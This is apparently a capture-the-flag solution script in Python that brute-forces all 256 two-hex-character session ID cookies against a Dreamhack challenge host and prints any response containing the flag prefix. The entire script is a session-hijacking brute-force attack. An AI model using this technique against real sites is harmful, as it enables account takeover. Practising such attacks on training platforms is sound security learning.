


import requests
import os


HOST = "http://host3.dreamhack.games:22117/"

import string
wordlist = "abcdef0123456789"

# tmp = os.urandom(4).hex()

for i in wordlist:
    for j in wordlist:
        tmp = i + j

        HEADERS = {
            "Cookie":f"sessionid={tmp}"
        }

#        print(tmp)
        r = requests.get(url=HOST, headers=HEADERS)
        if "DH" in r.text:
            print(r.text)



